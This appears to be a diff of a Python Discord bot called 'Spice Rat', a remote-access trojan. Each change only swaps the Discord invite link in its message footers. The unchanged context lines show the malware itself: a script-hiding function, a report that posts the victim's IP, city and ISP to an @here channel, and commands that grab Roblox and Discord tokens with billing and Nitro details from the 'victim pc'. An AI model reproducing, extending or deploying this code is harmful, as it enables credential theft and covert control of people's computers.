@@ -61,7 +61,7 @@ def spice_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="spice • TERMINAL", description=text, color=color)
     if thumbnail:
         embed.set_thumbnail(url="https://cdn.corenexis.com/f/y15N0UHkOAa.png")
-    embed.set_footer(text="Spice multitool _ https://discord.gg/eAK2dF6xYN", icon_url="https://cdn.corenexis.com/f/y15N0UHkOAa.png")
+    embed.set_footer(text="Spice multitool _ https://discord.gg/hJMHXkeCCw", icon_url="https://cdn.corenexis.com/f/y15N0UHkOAa.png")
     return embed
 
 def hide_script():
@@ -432,9 +432,9 @@ async def on_ready():
         value=f"**IP:** `{ip}` :flag_{flag.lower()}:\n**Location:** `{city}, {region}`\n**ISP:** `{isp}`",
         inline=False
     )
-    embed.set_thumbnail(url="https://discord.gg/eAK2dF6xYN")
+    embed.set_thumbnail(url="https://discord.gg/hJMHXkeCCw")
     embed.set_footer(
-        text="Spice multitool • https://discord.gg/eAK2dF6xYN",
+        text="Spice multitool • https://discord.gg/hJMHXkeCCw",
         icon_url="https://cdn.corenexis.com/f/y15N0UHkOAa.png"
     )
     await channel.send(content="@here", embed=embed)
@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!kill <session/all>`"
         )
 
-    e.set_footer(text="Spice Rat • https://discord.gg/eAK2dF6xYN")
+    e.set_footer(text="Spice Rat • https://discord.gg/hJMHXkeCCw")
     return e
 
 class HelpSelect(discord.ui.Select):
@@ -983,7 +983,7 @@ async def roblox(ctx):
     else:
         embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
 
-    embed.set_footer(text=f"Spice Multitool | https://discord.gg/eAK2dF6xYN")
+    embed.set_footer(text=f"Spice Multitool | https://discord.gg/hJMHXkeCCw")
 
     await ctx.send(embed=embed)
 
@@ -1025,7 +1025,7 @@ async def grab_tokens(ctx):
         embed.add_field(name=":gem: Nitro:", value=t['n'], inline=False)
         embed.add_field(name=":money_with_wings: Billing:", value=t['b'], inline=False)
         embed.add_field(name=":key: Token:", value=f"```{t['t']}```", inline=False)
-        embed.set_footer(text="Spice Rat • https://discord.gg/eAK2dF6xYN")
+        embed.set_footer(text="Spice Rat • https://discord.gg/hJMHXkeCCw")
         embeds_to_send.append(embed)
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"Spice found **{len(embeds_to_send)}** tokens on victim pc.")
@@ -1635,4 +1635,3 @@ async def on_message(message):
     await bot.process_commands(message)
 
 bot.run(token)
-
